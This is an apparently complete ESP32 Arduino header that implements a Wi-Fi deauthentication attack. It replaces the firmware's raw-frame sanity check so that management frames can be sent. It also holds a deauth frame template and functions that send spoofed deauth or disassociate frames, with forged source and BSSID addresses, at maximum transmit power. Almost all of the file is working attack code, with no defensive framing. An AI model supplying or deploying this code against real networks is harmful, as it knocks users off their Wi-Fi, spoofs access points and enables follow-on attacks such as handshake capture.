#ifndef DEAUTH_H
#define DEAUTH_H

#if defined(DEAUTHER)
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_system.h"

extern "C" int custom_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337)
        return 1;
    return 0;
}
#define ieee80211_raw_frame_sanity_check custom_ieee80211_raw_frame_sanity_check

static const uint8_t deauth_frame_template[] = {
    0x08, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0xC0, 0x00,
    0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF0, 0xFF,
    0x07, 0x00
};

void init_deauth_wifi() {
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(NULL);
    esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
    esp_wifi_config_80211_tx_rate(WIFI_IF_STA, WIFI_PHY_RATE_11M_L);
    esp_wifi_set_max_tx_power(84); // Max power (21 dBm)
    Serial.println("WiFi initialized for deauth");
}

/**
 * @brief Sends raw frame using esp_wifi_80211_tx
 */
void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
    if (result == ESP_OK) {
        Serial.println(" -> Sent frame");
    } else {
        Serial.print(" -> Failed to send frame: ");
        Serial.println(result, HEX);
    }
}

/**
 * @brief Prepares and sends management frame (deauth or disassociate)
 * 
 * @param chan Channel
 * @param receiverMAC Receiver MAC
 * @param sourceMAC Source MAC
 * @param bssidMAC BSSID MAC
 * @param frame_type Frame type (0xc0 deauth, 0xa0 disassociate)
 * @param reason Reason code
 */
void wsl_bypasser_send_deauth_frame(uint8_t chan, uint8_t *receiverMAC, uint8_t *sourceMAC, uint8_t *bssidMAC, uint8_t frame_type = 0xC0, uint16_t reason = 0x0007) {
    Serial.print("Preparing frame to receiver ");
    for (int j = 0; j < 6; j++) {
        Serial.print(receiverMAC[j], HEX);
        if (j < 5) Serial.print(":");
    }
    Serial.print(" from source ");
    for (int j = 0; j < 6; j++) {
        Serial.print(sourceMAC[j], HEX);
        if (j < 5) Serial.print(":");
    }
    Serial.println();

    esp_err_t chanResult = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    if (chanResult != ESP_OK) {
        Serial.print("Failed to set channel: ");
        Serial.println(chanResult, HEX);
        return;
    }
    delay(50);

    uint8_t frame[sizeof(deauth_frame_template)];
    memcpy(frame, deauth_frame_template, sizeof(deauth_frame_template));

    frame[8] = frame_type;

    memcpy(frame + 12, receiverMAC, 6);
    memcpy(frame + 18, sourceMAC, 6);
    memcpy(frame + 24, bssidMAC, 6);

    uint16_t seqNum = random(0, 4096) << 4;
    frame[30] = seqNum & 0xFF;
    frame[31] = (seqNum >> 8) & 0xFF;

    frame[32] = reason & 0xFF;
    frame[33] = (reason >> 8) & 0xFF;

    for (int i = 0; i < 3; i++) {
        wsl_bypasser_send_raw_frame(frame, sizeof(frame));
        delay(10);
    }
}

#endif
#endif